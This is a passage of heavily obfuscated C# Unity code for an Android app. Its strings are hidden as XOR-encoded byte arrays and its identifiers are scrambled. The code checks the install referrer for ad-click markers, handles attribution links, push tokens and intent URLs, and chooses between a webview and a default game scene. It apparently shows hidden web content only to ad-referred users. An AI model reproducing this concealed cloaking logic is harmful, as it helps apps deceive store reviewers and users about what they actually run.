100, 121, 104, 106, 121, 114, 51, 49, 60, 55, 50, 59, 100, 56, 63, 50, 45, 59, 114, 51, 49, 58, 59, 50, 100, 121, 121, 114, 46, 50, 63, 42, 56, 49, 44, 51, 100, 121, 9, 55, 48, 58, 49, 41, 45, 121, 114, 46, 50, 63, 42, 56, 49, 44, 51, 8, 59, 44, 45, 55, 49, 48, 100, 121, 111, 107, 112, 110, 112, 110, 121, 114, 43, 63, 24, 43, 50, 50, 8, 59, 44, 45, 55, 49, 48, 100, 121, 111, 108, 110, 112, 110, 112, 110, 112, 110, 121, 35, 119, 101, 35, 35, 101, 17, 60, 52, 59, 61, 42, 112, 58, 59, 56, 55, 48, 59, 14, 44, 49, 46, 59, 44, 42, 39, 118, 46, 44, 49, 42, 49, 114, 121, 43, 45, 59, 44, 31, 57, 59, 48, 42, 26, 63, 42, 63, 121, 114, 37, 57, 59, 42, 100, 56, 43, 48, 61, 42, 55, 49, 48, 118, 119, 37, 44, 59, 42, 43, 44, 48, 126, 43, 63, 58, 101, 35, 114, 61, 49, 48, 56, 55, 57, 43, 44, 63, 60, 50, 59, 100, 42, 44, 43, 59, 35, 119, 101, 35, 61, 63, 42, 61, 54, 118, 59, 119, 37, 35 }, 94) + _0x6bb1939a._0x92fa81ce(new byte[112] { 55, 54, 53, 123, 32, 48, 33, 54, 54, 61, 127, 116, 36, 58, 55, 39, 59, 116, 127, 98, 106, 97, 99, 122, 104, 55, 54, 53, 123, 32, 48, 33, 54, 54, 61, 127, 116, 59, 54, 58, 52, 59, 39, 116, 127, 98, 99, 107, 99, 122, 104, 55, 54, 53, 123, 32, 48, 33, 54, 54, 61, 127, 116, 50, 37, 50, 58, 63, 4, 58, 55, 39, 59, 116, 127, 98, 106, 97, 99, 122, 104, 55, 54, 53, 123, 32, 48, 33, 54, 54, 61, 127, 116, 50, 37, 50, 58, 63, 27, 54, 58, 52, 59, 39, 116, 127, 98, 99, 103, 99, 122, 104 }, 83) + _0x6bb1939a._0x92fa81ce(new byte[45] { 161, 167, 172, 174, 162, 188, 187, 177, 186, 162, 251, 186, 187, 161, 186, 160, 182, 189, 166, 161, 180, 167, 161, 232, 160, 187, 177, 176, 179, 188, 187, 176, 177, 238, 168, 182, 180, 161, 182, 189, 253, 176, 252, 174, 168 }, 213) + _0x6bb1939a._0x92fa81ce(new byte[721] { 76, 74, 65, 67, 78, 89, 74, 24, 87, 74, 81, 95, 5, 79, 81, 86, 92, 87, 79, 22, 85, 89, 76, 91, 80, 117, 93, 92, 81, 89, 22, 90, 81, 86, 92, 16, 79, 81, 86, 92, 87, 79, 17, 3, 79, 81, 86, 92, 87, 79, 22, 85, 89, 76, 91, 80, 117, 93, 92, 81, 89, 5, 94, 77, 86, 91, 76, 81, 87, 86, 16, 73, 17, 67, 78, 89, 74, 24, 75, 5, 107, 76, 74, 81, 86, 95, 16, 73, 17, 22, 76, 87, 116, 87, 79, 93, 74, 123, 89, 75, 93, 16, 17, 3, 81, 94, 16, 75, 22, 81, 86, 92, 93, 64, 119, 94, 16, 31, 72, 87, 81, 86, 76, 93, 74, 2, 24, 91, 87, 89, 74, 75, 93, 31, 17, 6, 5, 8, 68, 68, 75, 22, 81, 86, 92, 93, 64, 119, 94, 16, 31, 80, 87, 78, 93, 74, 2, 24, 86, 87, 86, 93, 31, 17, 6, 5, 8, 68, 68, 75, 22, 81, 86, 92, 93, 64, 119, 94, 16, 31, 85, 89, 64, 21, 79, 81, 92, 76, 80, 31, 17, 6, 5, 8, 68, 68, 75, 22, 81, 86, 92, 93, 64, 119, 94, 16, 31, 85, 89, 64, 21, 92, 93, 78, 81, 91, 93, 21, 79, 81, 92, 76, 80, 31, 17, 6, 5, 8, 17, 74, 93, 76, 77, 74, 86, 24, 67, 85, 89, 76, 91, 80, 93, 75, 2, 94, 89, 84, 75, 93, 20, 85, 93, 92, 81, 89, 2, 73, 20, 87, 86, 91, 80, 89, 86, 95, 93, 2, 86, 77, 84, 84, 20, 89, 92, 92, 116, 81, 75, 76, 93, 86, 93, 74, 2, 94, 77, 86, 91, 76, 81, 87, 86, 16, 17, 67, 69, 20, 74, 93, 85, 87, 78, 93, 116, 81, 75, 76, 93, 86, 93, 74, 2, 94, 77, 86, 91, 76, 81, 87, 86, 16, 17, 67, 69, 20, 89, 92, 92, 125, 78, 93, 86, 76, 116, 81, 75, 76, 93, 86, 93, 74, 2, 94, 77, 86, 91, 76, 81, 87, 86, 16, 17, 67, 69, 20, 74, 93, 85, 87, 78, 93, 125, 78, 93, 86, 76, 116, 81, 75, 76, 93, 86, 93, 74, 2, 94, 77, 86, 91, 76, 81, 87, 86, 16, 17, 67, 69, 20, 92, 81, 75, 72, 89, 76, 91, 80, 125, 78, 93, 86, 76, 2, 94, 77, 86, 91, 76, 81, 87, 86, 16, 17, 67, 74, 93, 76, 77, 74, 86, 24, 94, 89, 84, 75, 93, 3, 69, 69, 3, 81, 94, 16, 75, 22, 81, 86, 92, 93, 64, 119, 94, 16, 31, 72, 87, 81, 86, 76, 93, 74, 2, 24, 94, 81, 86, 93, 31, 17, 6, 5, 8, 68, 68, 75, 22, 81, 86, 92, 93, 64, 119, 94, 16, 31, 80, 87, 78, 93, 74, 2, 24, 80, 87, 78, 93, 74, 31, 17, 6, 5, 8, 17, 74, 93, 76, 77, 74, 86, 24, 67, 85, 89, 76, 91, 80, 93, 75, 2, 76, 74, 77, 93, 20, 85, 93, 92, 81, 89, 2, 73, 20, 87, 86, 91, 80, 89, 86, 95, 93, 2, 86, 77, 84, 84, 20, 89, 92, 92, 116, 81, 75, 76, 93, 86, 93, 74, 2, 94, 77, 86, 91, 76, 81, 87, 86, 16, 17, 67, 69, 20, 74, 93, 85, 87, 78, 93, 116, 81, 75, 76, 93, 86, 93, 74, 2, 94, 77, 86, 91, 76, 81, 87, 86, 16, 17, 67, 69, 20, 89, 92, 92, 125, 78, 93, 86, 76, 116, 81, 75, 76, 93, 86, 93, 74, 2, 94, 77, 86, 91, 76, 81, 87, 86, 16, 17, 67, 69, 20, 74, 93, 85, 87, 78, 93, 125, 78, 93, 86, 76, 116, 81, 75, 76, 93, 86, 93, 74, 2, 94, 77, 86, 91, 76, 81, 87, 86, 16, 17, 67, 69, 20, 92, 81, 75, 72, 89, 76, 91, 80, 125, 78, 93, 86, 76, 2, 94, 77, 86, 91, 76, 81, 87, 86, 16, 17, 67, 74, 93, 76, 77, 74, 86, 24, 94, 89, 84, 75, 93, 3, 69, 69, 3, 74, 93, 76, 77, 74, 86, 24, 87, 74, 81, 95, 16, 73, 17, 3, 69, 3, 69, 91, 89, 76, 91, 80, 16, 93, 17, 67, 69 }, 56) + _0x6bb1939a._0x92fa81ce(new byte[5] { 109, 57, 56, 57, 43 }, 16);
    }

    private bool _0x5ac9cae2(string _0x864d4159)
    {
        try
        {
            using (var _0x79fb6d5a = new AndroidJavaClass(_0x6bb1939a._0x92fa81ce(new byte[30] { 49, 61, 63, 124, 39, 60, 59, 38, 43, 97, 54, 124, 34, 62, 51, 43, 55, 32, 124, 7, 60, 59, 38, 43, 2, 62, 51, 43, 55, 32 }, 82)))
            using (var _0x657812a4 = _0x79fb6d5a.GetStatic<AndroidJavaObject>(_0x6bb1939a._0x92fa81ce(new byte[15] { 104, 126, 121, 121, 110, 101, 127, 74, 104, 127, 98, 125, 98, 127, 114 }, 11)))
            using (var _0x380e9d24 = _0x657812a4.Call<AndroidJavaObject>(_0x6bb1939a._0x92fa81ce(new byte[17] { 115, 113, 96, 68, 117, 119, 127, 117, 115, 113, 89, 117, 122, 117, 115, 113, 102 }, 20)))
            using (var _0x7bc31b09 = new AndroidJavaClass(_0x6bb1939a._0x92fa81ce(new byte[22] { 172, 163, 169, 191, 162, 164, 169, 227, 174, 162, 163, 185, 168, 163, 185, 227, 132, 163, 185, 168, 163, 185 }, 205)))
            using (var _0x0b63a751 = _0x7bc31b09.CallStatic<AndroidJavaObject>(_0x6bb1939a._0x92fa81ce(new byte[8] { 199, 214, 197, 196, 210, 226, 197, 222 }, 183), _0x864d4159, 1))
            {
                string _0xdcc1edb0 = _0x0b63a751.Call<string>(_0x6bb1939a._0x92fa81ce(new byte[14] { 151, 149, 132, 163, 132, 130, 153, 158, 151, 181, 136, 132, 130, 145 }, 240), _0x6bb1939a._0x92fa81ce(new byte[20] { 139, 155, 134, 158, 154, 140, 155, 182, 143, 136, 133, 133, 139, 136, 138, 130, 182, 156, 155, 133 }, 233));
                string _0x5955a2a2 = _0x0b63a751.Call<string>(_0x6bb1939a._0x92fa81ce(new byte[10] { 179, 177, 160, 132, 181, 183, 191, 181, 179, 177 }, 212));
                _0x0b63a751.Call<AndroidJavaObject>(_0x6bb1939a._0x92fa81ce(new byte[11] { 6, 3, 3, 36, 6, 19, 2, 0, 8, 21, 30 }, 103), _0x6bb1939a._0x92fa81ce(new byte[33] { 103, 104, 98, 116, 105, 111, 98, 40, 111, 104, 114, 99, 104, 114, 40, 101, 103, 114, 99, 97, 105, 116, 127, 40, 68, 84, 73, 81, 85, 71, 68, 74, 67 }, 6));
                _0x0b63a751.Call<AndroidJavaObject>(_0x6bb1939a._0x92fa81ce(new byte[11] { 53, 34, 42, 40, 49, 34, 2, 63, 51, 53, 38 }, 71), _0x6bb1939a._0x92fa81ce(new byte[20] { 51, 35, 62, 38, 34, 52, 35, 14, 55, 48, 61, 61, 51, 48, 50, 58, 14, 36, 35, 61 }, 81));
                if (_0x0b63a751.Call<AndroidJavaObject>(_0x6bb1939a._0x92fa81ce(new byte[15] { 165, 178, 164, 184, 187, 161, 178, 150, 180, 163, 190, 161, 190, 163, 174 }, 215), _0x380e9d24) != null)
                {
                    WLog(_0x6bb1939a._0x92fa81ce(new byte[24] { 72, 99, 121, 100, 102, 110, 71, 98, 96, 110, 43, 100, 123, 110, 101, 43, 98, 101, 127, 110, 101, 127, 49, 43 }, 11) + _0x864d4159);
                    _0x0b63a751.Call<AndroidJavaObject>(_0x6bb1939a._0x92fa81ce(new byte[8] { 139, 142, 142, 172, 134, 139, 141, 153 }, 234), 0x10000000);
                    _0x657812a4.Call(_0x6bb1939a._0x92fa81ce(new byte[13] { 191, 184, 173, 190, 184, 141, 175, 184, 165, 186, 165, 184, 181 }, 204), _0x0b63a751);
                    return true;
                }

                if (_0x21cf754d(_0x5955a2a2))
                    return true;
                if (!string.IsNullOrEmpty(_0xdcc1edb0))
                {
                    WLog(_0x6bb1939a._0x92fa81ce(new byte[28] { 248, 211, 201, 212, 214, 222, 247, 210, 208, 222, 155, 210, 213, 207, 222, 213, 207, 155, 221, 218, 215, 215, 217, 218, 216, 208, 129, 155 }, 187) + _0xdcc1edb0);
                    if (_0x83ff5890(_0xdcc1edb0))
                        return _0x05e5bc35(_0xdcc1edb0, _0x5955a2a2);
                    return _0x67a8d970(_0xdcc1edb0);
                }

                WLog(_0x6bb1939a._0x92fa81ce(new byte[30] { 106, 65, 91, 70, 68, 76, 101, 64, 66, 76, 9, 64, 71, 93, 76, 71, 93, 9, 71, 70, 9, 65, 72, 71, 77, 69, 76, 91, 19, 9 }, 41) + _0x864d4159);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0x6bb1939a._0x92fa81ce(new byte[26] { 200, 227, 249, 228, 230, 238, 199, 226, 224, 238, 171, 226, 229, 255, 238, 229, 255, 171, 237, 234, 226, 231, 238, 239, 177, 171 }, 139) + e.Message);
            return true;
        }
    }

    private IEnumerator _0x0f7d9623()
    {
        {
#if B_LOGS
            {
                Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[26] { 103, 104, 89, 79, 72, 97, 28, 117, 82, 85, 72, 85, 93, 80, 85, 70, 89, 110, 89, 90, 90, 89, 78, 89, 78, 28 }, 60));
            }
#endif
        }

        bool _0x42f0163a = false;
        InstallReferrer.GetReferrer((_0xa5b27e2e) =>
        {
            Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[24] { 51, 60, 13, 27, 28, 72, 58, 13, 14, 13, 26, 26, 13, 26, 53, 72, 15, 13, 28, 72, 138, 238, 250, 72 }, 104) + _0x6432cf65);
            if (_0xa5b27e2e.IsSuccess)
            {
                _0x6432cf65 = _0xa5b27e2e.InstallReferrer ?? "";
                {
#if B_LOGS
                    Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[28] { 70, 73, 120, 110, 105, 61, 79, 120, 123, 120, 111, 111, 120, 111, 64, 61, 78, 104, 126, 126, 120, 110, 110, 61, 255, 155, 143, 61 }, 29) + _0x6432cf65);
#endif
                }
            }
            else
            {
                {
#if B_LOGS
                    Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[27] { 172, 163, 146, 132, 131, 215, 165, 146, 145, 146, 133, 133, 146, 133, 170, 215, 177, 150, 158, 155, 146, 147, 215, 21, 113, 101, 215 }, 247) + _0xa5b27e2e);
#endif
                }

                _0x6432cf65 = "";
            }

            _0x2fa07cd8 = true;
        });
        StartCoroutine(_0xdd937726(2f));
        yield return new WaitUntil(() => _0x2fa07cd8);
        {
#if B_LOGS
            Debug.Log($"[Test] check google atr {_0x6432cf65}");
#endif
        }

        bool _0x99de7ece = _0x6432cf65.Contains(_0x6bb1939a._0x92fa81ce(new byte[6] { 254, 250, 245, 240, 253, 164 }, 153));
        _0x42f0163a = _0x99de7ece || _0x6432cf65.Contains(_0x6bb1939a._0x92fa81ce(new byte[18] { 229, 244, 244, 247, 170, 237, 234, 247, 240, 229, 227, 246, 229, 233, 170, 231, 235, 233 }, 132)) || _0x6432cf65.Contains(_0x6bb1939a._0x92fa81ce(new byte[17] { 233, 248, 248, 251, 166, 238, 233, 235, 237, 234, 231, 231, 227, 166, 235, 231, 229 }, 136));
        _0xc289dcbd = _0x99de7ece ? "" : (_0x42f0163a ? "" : _0xc289dcbd);
        _0xc289dcbd = _0xc289dcbd ?? "";
        _0x34812c0c = _0x34812c0c ?? "";
        {
#if B_LOGS
            Debug.Log($"[Test] oneLinkData (FB): {_0xc289dcbd}");
#endif
        }
    }

    private float _0xcd3046c7 = 0f;
    private void OnApplicationFocus(bool _0x1c032846)
    {
        isApplicationFocus = _0x1c032846;
        if (_0x1c032846 && _0xa32ed23d)
        {
            _0xced42c31();
        }
    }

    internal bool IsGoogleAuthFlowUrl(string _0xe4d2281e)
    {
        if (string.IsNullOrEmpty(_0xe4d2281e))
            return false;
        return _0xe4d2281e.IndexOf(_0x6bb1939a._0x92fa81ce(new byte[19] { 227, 225, 225, 237, 247, 236, 246, 241, 172, 229, 237, 237, 229, 238, 231, 172, 225, 237, 239 }, 130), StringComparison.OrdinalIgnoreCase) >= 0 || _0xe4d2281e.IndexOf(_0x6bb1939a._0x92fa81ce(new byte[16] { 220, 222, 222, 210, 200, 211, 201, 206, 147, 218, 210, 210, 218, 209, 216, 147 }, 189), StringComparison.OrdinalIgnoreCase) >= 0 || _0xe4d2281e.IndexOf(_0x6bb1939a._0x92fa81ce(new byte[21] { 183, 191, 191, 183, 188, 181, 165, 163, 181, 162, 179, 191, 190, 164, 181, 190, 164, 254, 179, 191, 189 }, 208), StringComparison.OrdinalIgnoreCase) >= 0 || _0xe4d2281e.IndexOf(_0x6bb1939a._0x92fa81ce(new byte[11] { 241, 229, 226, 247, 226, 255, 245, 184, 245, 249, 251 }, 150), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private IEnumerator RequestAndroidPermissionIfNeeded(string _0x5686606e)
    {
        if (Permission.HasUserAuthorizedPermission(_0x5686606e))
            yield break;
        bool _0xa1a6d5b1 = false;
        var _0xd0df9834 = new PermissionCallbacks();
        _0xd0df9834.PermissionGranted += _0x8d9971fd => _0xa1a6d5b1 = true;
        _0xd0df9834.PermissionDenied += _0x8d9971fd => _0xa1a6d5b1 = true;
        Permission.RequestUserPermission(_0x5686606e, _0xd0df9834);
        yield return new WaitUntil(() => _0xa1a6d5b1);
    }

    private bool _0xa9f56b29(int _0xab4ab0da, string _0xce6eb2b3, string _0xb11bebe5)
    {
        if (string.IsNullOrEmpty(_0xb11bebe5))
            return false;
        if (!IsHttpUrl(_0xb11bebe5))
            return true;
        if (string.IsNullOrEmpty(_0xce6eb2b3))
            return false;
        return _0xce6eb2b3.IndexOf(_0x6bb1939a._0x92fa81ce(new byte[20] { 124, 107, 107, 102, 122, 118, 119, 119, 124, 122, 109, 112, 118, 119, 102, 107, 124, 106, 124, 109 }, 57), StringComparison.OrdinalIgnoreCase) >= 0 || _0xce6eb2b3.IndexOf(_0x6bb1939a._0x92fa81ce(new byte[22] { 55, 32, 32, 45, 49, 61, 60, 60, 55, 49, 38, 59, 61, 60, 45, 32, 55, 52, 39, 33, 55, 54 }, 114), StringComparison.OrdinalIgnoreCase) >= 0 || _0xce6eb2b3.IndexOf(_0x6bb1939a._0x92fa81ce(new byte[21] { 16, 7, 7, 10, 22, 26, 27, 27, 16, 22, 1, 28, 26, 27, 10, 22, 25, 26, 6, 16, 17 }, 85), StringComparison.OrdinalIgnoreCase) >= 0 || _0xce6eb2b3.IndexOf(_0x6bb1939a._0x92fa81ce(new byte[22] { 64, 87, 87, 90, 80, 75, 78, 75, 74, 82, 75, 90, 80, 87, 73, 90, 86, 70, 77, 64, 72, 64 }, 5), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private Task _0x29266bea(IEnumerator _0x5c58652a)
    {
        var _0x40ef852d = new TaskCompletionSource<bool>();
        StartCoroutine(_0x3e207760(_0x5c58652a, _0x40ef852d));
        return _0x40ef852d.Task;
    }

    private async Task<bool> _0xb79d4a27()
    {
        _0x2849c271.Instance?._0xde8e230a();
        PushNotificationsService.Instance.OnRemoteNotificationReceived += (_0xf22f8c0a) =>
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[32] { 50, 61, 12, 26, 29, 52, 73, 60, 7, 0, 29, 16, 73, 57, 28, 26, 1, 73, 39, 6, 29, 0, 15, 0, 10, 8, 29, 0, 6, 7, 83, 73 }, 105) + string.Join(_0x6bb1939a._0x92fa81ce(new byte[1] { 54 }, 63), _0xf22f8c0a));
                }
#endif
            }
        };
        try
        {
            _0xd2370ed3 = await PushNotificationsService.Instance.RegisterForPushNotificationsAsync();
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[31] { 154, 149, 164, 178, 181, 156, 225, 135, 160, 168, 173, 164, 165, 225, 181, 174, 225, 166, 164, 181, 225, 177, 180, 178, 169, 225, 181, 174, 170, 164, 175 }, 193));
                }
#endif
            }

            _0xd2370ed3 = "";
        }

        _0xfba3e12a = !string.IsNullOrEmpty(_0xd2370ed3);
        _0xccab212e = _0x64e8d81b();
        {
#if B_LOGS
            Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[25] { 71, 72, 121, 111, 104, 65, 60, 73, 114, 117, 104, 101, 60, 76, 105, 111, 116, 60, 72, 115, 119, 121, 114, 38, 60 }, 28) + _0xd2370ed3);
#endif
        }

        _0x2849c271.Instance?._0x25ead04b();
        return false;
    }

    private bool _0x119d7677 = false;
    internal bool _0x83ff5890(string _0x4d725e59)
    {
        return _0x4d725e59.StartsWith(_0x6bb1939a._0x92fa81ce(new byte[9] { 177, 189, 174, 183, 185, 168, 230, 243, 243 }, 220), StringComparison.OrdinalIgnoreCase) || _0x4d725e59.StartsWith(_0x6bb1939a._0x92fa81ce(new byte[24] { 60, 32, 32, 36, 39, 110, 123, 123, 36, 56, 53, 45, 122, 51, 59, 59, 51, 56, 49, 122, 55, 59, 57, 123 }, 84), StringComparison.OrdinalIgnoreCase) || _0x4d725e59.StartsWith(_0x6bb1939a._0x92fa81ce(new byte[23] { 114, 110, 110, 106, 32, 53, 53, 106, 118, 123, 99, 52, 125, 117, 117, 125, 118, 127, 52, 121, 117, 119, 53 }, 26), StringComparison.OrdinalIgnoreCase);
    }

    private void _0x5825b14c(string _0x0975d031)
    {
        bool _0x6e5f48bb = !string.IsNullOrEmpty(_0x0975d031);
        if (_0x6e5f48bb)
        {
            {
#if B_LOGS
                Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[13] { 201, 198, 247, 225, 230, 207, 178, 193, 250, 253, 229, 168, 178 }, 146) + _0x0975d031);
#endif
            }

            _0x07866a0f(_0x0975d031);
            return;
        }
        else
        {
            {
#if B_LOGS
                Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[39] { 172, 163, 146, 132, 131, 170, 215, 177, 150, 155, 155, 149, 150, 148, 156, 215, 21, 113, 101, 215, 176, 150, 154, 146, 215, 223, 153, 152, 215, 145, 158, 153, 150, 155, 215, 162, 165, 187, 222 }, 247));
#endif
            }

            _0xf2040507();
            return;
        }
    }

    private string _0xbf0d9e0b = "";
    private string _0x2d48df0b;
    private string _0xccab212e = "";
    private string _0xbf05bd49(string _0xeb428989, string _0x48181da8)
    {
        if (string.IsNullOrEmpty(_0x48181da8))
            return _0xeb428989;
        if (_0xeb428989.Contains(_0x6bb1939a._0x92fa81ce(new byte[1] { 53 }, 10)))
            return _0xeb428989 + _0x6bb1939a._0x92fa81ce(new byte[8] { 100, 49, 39, 44, 38, 43, 38, 127 }, 66) + UnityWebRequest.EscapeURL(_0x48181da8);
        else
            return _0xeb428989 + _0x6bb1939a._0x92fa81ce(new byte[8] { 106, 38, 48, 59, 49, 60, 49, 104 }, 85) + UnityWebRequest.EscapeURL(_0x48181da8);
    }

    private string _0x4d03db03()
    {
        try
        {
            using (var _0xc4c78121 = new AndroidJavaClass(_0x6bb1939a._0x92fa81ce(new byte[30] { 172, 160, 162, 225, 186, 161, 166, 187, 182, 252, 171, 225, 191, 163, 174, 182, 170, 189, 225, 154, 161, 166, 187, 182, 159, 163, 174, 182, 170, 189 }, 207)))
            {
                var _0x6541e0e8 = _0xc4c78121.GetStatic<AndroidJavaObject>(_0x6bb1939a._0x92fa81ce(new byte[15] { 56, 46, 41, 41, 62, 53, 47, 26, 56, 47, 50, 45, 50, 47, 34 }, 91));
                var _0x31651405 = _0x6541e0e8.Call<AndroidJavaObject>(_0x6bb1939a._0x92fa81ce(new byte[21] { 194, 192, 209, 228, 213, 213, 201, 204, 198, 196, 209, 204, 202, 203, 230, 202, 203, 209, 192, 221, 209 }, 165));
                using (var _0x33248c7f = new AndroidJavaClass(_0x6bb1939a._0x92fa81ce(new byte[26] { 211, 220, 214, 192, 221, 219, 214, 156, 197, 215, 208, 217, 219, 198, 156, 229, 215, 208, 225, 215, 198, 198, 219, 220, 213, 193 }, 178)))
                {
                    return _0x33248c7f.CallStatic<string>(_0x6bb1939a._0x92fa81ce(new byte[19] { 198, 196, 213, 229, 196, 199, 192, 212, 205, 213, 244, 210, 196, 211, 224, 198, 196, 207, 213 }, 161), _0x31651405);
                }
            }
        }
        catch
        {
            return "";
        }
    }

    private bool _0xba90566a = false;
    private readonly string[] _0x5616991b = new string[]
    {
        _0x6bb1939a._0x92fa81ce(new byte[60] { 218, 181, 164, 154, 10, 126, 66, 79, 10, 88, 79, 79, 70, 89, 10, 75, 88, 79, 10, 66, 69, 94, 10, 88, 67, 77, 66, 94, 10, 68, 69, 93, 10, 200, 170, 185, 10, 78, 69, 68, 200, 170, 179, 94, 10, 71, 67, 89, 89, 10, 83, 69, 95, 88, 10, 89, 90, 67, 68, 11 }, 42),
        _0x6bb1939a._0x92fa81ce(new byte[52] { 187, 212, 198, 203, 107, 2, 63, 107, 40, 36, 62, 39, 47, 107, 41, 46, 107, 50, 36, 62, 57, 107, 39, 62, 40, 32, 50, 107, 38, 36, 38, 46, 37, 63, 107, 169, 203, 216, 107, 60, 35, 50, 107, 56, 63, 36, 59, 107, 37, 36, 60, 116 }, 75),
        _0x6bb1939a._0x92fa81ce(new byte[66] { 24, 96, 91, 21, 66, 117, 218, 184, 147, 157, 218, 141, 147, 148, 137, 218, 155, 136, 159, 218, 146, 147, 142, 142, 147, 148, 157, 218, 151, 149, 136, 159, 218, 149, 156, 142, 159, 148, 218, 142, 149, 158, 155, 131, 218, 24, 122, 105, 218, 137, 142, 155, 131, 218, 147, 148, 218, 142, 146, 159, 218, 157, 155, 151, 159, 212 }, 250),
        _0x6bb1939a._0x92fa81ce(new byte[54] { 87, 56, 50, 53, 135, 243, 207, 206, 212, 135, 206, 212, 135, 215, 213, 206, 202, 194, 135, 211, 206, 202, 194, 135, 69, 39, 52, 135, 211, 207, 194, 135, 197, 194, 212, 211, 135, 215, 203, 198, 222, 194, 213, 212, 135, 215, 203, 198, 222, 135, 201, 200, 208, 137 }, 167),
        _0x6bb1939a._0x92fa81ce(new byte[48] { 197, 170, 161, 144, 21, 108, 90, 64, 71, 21, 66, 92, 91, 91, 92, 91, 82, 21, 70, 65, 71, 80, 84, 94, 21, 86, 90, 64, 89, 81, 21, 87, 80, 21, 90, 91, 80, 21, 70, 69, 92, 91, 21, 84, 66, 84, 76, 27 }, 53),
        _0x6bb1939a._0x92fa81ce(new byte[65] { 226, 141, 136, 146, 50, 88, 115, 113, 121, 98, 125, 102, 97, 50, 115, 96, 119, 50, 127, 125, 96, 119, 50, 115, 113, 102, 123, 100, 119, 50, 102, 125, 124, 123, 117, 122, 102, 50, 240, 146, 129, 50, 97, 102, 115, 107, 50, 115, 124, 118, 50, 102, 96, 107, 50, 107, 125, 103, 96, 50, 126, 103, 113, 121, 60 }, 18),
        _0x6bb1939a._0x92fa81ce(new byte[55] { 137, 230, 247, 203, 89, 60, 15, 28, 11, 0, 89, 10, 9, 16, 23, 89, 26, 22, 12, 23, 13, 10, 89, 155, 249, 234, 89, 13, 17, 28, 89, 23, 28, 1, 13, 89, 22, 23, 28, 89, 26, 22, 12, 21, 29, 89, 27, 28, 89, 0, 22, 12, 11, 10, 87 }, 121),
        _0x6bb1939a._0x92fa81ce(new byte[63] { 168, 231, 218, 165, 242, 197, 106, 26, 38, 43, 51, 47, 56, 57, 106, 56, 35, 45, 34, 62, 106, 36, 37, 61, 106, 43, 56, 47, 106, 61, 35, 36, 36, 35, 36, 45, 106, 168, 202, 217, 106, 46, 37, 36, 168, 202, 211, 62, 106, 61, 43, 38, 33, 106, 43, 61, 43, 51, 106, 51, 47, 62, 100 }, 74),
        _0x6bb1939a._0x92fa81ce(new byte[51] { 223, 176, 160, 169, 15, 96, 65, 67, 86, 15, 91, 71, 64, 92, 74, 15, 88, 71, 64, 15, 92, 91, 78, 86, 15, 70, 65, 15, 91, 71, 74, 15, 72, 78, 66, 74, 15, 88, 70, 65, 15, 91, 71, 74, 15, 95, 93, 70, 85, 74, 1 }, 47),
        _0x6bb1939a._0x92fa81ce(new byte[64] { 141, 245, 206, 128, 215, 224, 79, 34, 0, 2, 10, 1, 27, 26, 2, 79, 6, 28, 79, 10, 25, 10, 29, 22, 27, 7, 6, 1, 8, 79, 141, 239, 252, 79, 4, 10, 10, 31, 79, 28, 31, 6, 1, 1, 6, 1, 8, 79, 9, 0, 29, 79, 22, 0, 26, 29, 79, 12, 7, 14, 1, 12, 10, 65 }, 111)
    };
    internal bool IsHttpUrl(string _0x61f320e4)
    {
        if (string.IsNullOrEmpty(_0x61f320e4))
            return false;
        return _0x61f320e4.StartsWith(_0x6bb1939a._0x92fa81ce(new byte[7] { 69, 89, 89, 93, 23, 2, 2 }, 45), StringComparison.OrdinalIgnoreCase) || _0x61f320e4.StartsWith(_0x6bb1939a._0x92fa81ce(new byte[8] { 109, 113, 113, 117, 118, 63, 42, 42 }, 5), StringComparison.OrdinalIgnoreCase);
    }

    private IEnumerator _0x1e363ff3()
    {
        yield return RequestAndroidPermissionIfNeeded(Permission.Camera);
    }

    public void _0xf2040507()
    {
        isDestroyedForce = true;
        StopAllCoroutines();
        {
#if B_LOGS
            Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[18] { 148, 155, 170, 188, 187, 146, 239, 131, 174, 186, 161, 172, 167, 239, 136, 174, 162, 170 }, 207));
#endif
        }

        _0x2849c271.Instance?._0x5ee9341d();
        _0x3e2c0a04.Instance._0x83b29986(_0xcb53ffe7._0x51899f64.DEFAULT);
    }

    private int _0x56bfde11 = 0;
    // WEB VIEW LOGIC
    public bool _0xa32ed23d { get; set; }

    private string _0x700d5500 = "";
    private bool _0x67a8d970(string _0xc2fe0bba)
    {
        try
        {
            using (var _0x6117851e = new AndroidJavaClass(_0x6bb1939a._0x92fa81ce(new byte[30] { 168, 164, 166, 229, 190, 165, 162, 191, 178, 248, 175, 229, 187, 167, 170, 178, 174, 185, 229, 158, 165, 162, 191, 178, 155, 167, 170, 178, 174, 185 }, 203)))
            using (var _0x91e6a62c = _0x6117851e.GetStatic<AndroidJavaObject>(_0x6bb1939a._0x92fa81ce(new byte[15] { 183, 161, 166, 166, 177, 186, 160, 149, 183, 160, 189, 162, 189, 160, 173 }, 212)))
            using (var _0xf050dd84 = new AndroidJavaClass(_0x6bb1939a._0x92fa81ce(new byte[15] { 155, 148, 158, 136, 149, 147, 158, 212, 148, 159, 142, 212, 175, 136, 147 }, 250)))
            using (var _0x8720618a = _0xf050dd84.CallStatic<AndroidJavaObject>(_0x6bb1939a._0x92fa81ce(new byte[5] { 162, 179, 160, 161, 183 }, 210), _0xc2fe0bba))
            using (var _0x1a54f09a = new AndroidJavaObject(_0x6bb1939a._0x92fa81ce(new byte[22] { 192, 207, 197, 211, 206, 200, 197, 143, 194, 206, 207, 213, 196, 207, 213, 143, 232, 207, 213, 196, 207, 213 }, 161), _0x6bb1939a._0x92fa81ce(new byte[26] { 205, 194, 200, 222, 195, 197, 200, 130, 197, 194, 216, 201, 194, 216, 130, 205, 207, 216, 197, 195, 194, 130, 250, 229, 233, 251 }, 172), _0x8720618a))
            {
